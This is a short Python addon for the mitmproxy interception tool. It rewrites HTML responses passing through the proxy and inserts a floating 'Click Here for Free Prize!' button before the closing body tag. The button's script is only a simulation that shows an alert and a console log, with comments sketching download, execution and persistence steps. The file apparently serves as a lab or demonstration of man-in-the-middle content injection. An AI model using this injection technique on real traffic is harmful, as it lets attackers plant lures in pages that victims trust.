from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    # Only modify HTML responses from your target server
    if "text/html" in flow.response.headers.get("content-type", ""):
        # Original HTML content
        html_content = flow.response.text
        
        # Malicious button HTML to inject
        malicious_button = """
        <div style="position: fixed; bottom: 20px; right: 20px; z-index: 9999;">
            <button onclick="installMalware()" 
                    style="background-color: red; color: white; padding: 15px 30px; 
                           font-size: 16px; border: none; cursor: pointer; border-radius: 5px;">
                Click Here for Free Prize!
            </button>
        </div>
        <script>
        function installMalware() {
            alert('Malware installation initiated!');
            // In a real attack, this would:
            // 1. Download malicious payload
            // 2. Execute code
            // 3. Establish persistence
            console.log('Simulated malware execution');
        }
        </script>
        """
        
        # Inject the malicious button before closing </body> tag
        if "</body>" in html_content:
            modified_html = html_content.replace("</body>", malicious_button + "</body>")
            flow.response.text = modified_html
            print("[+] Injected malicious button into HTML response")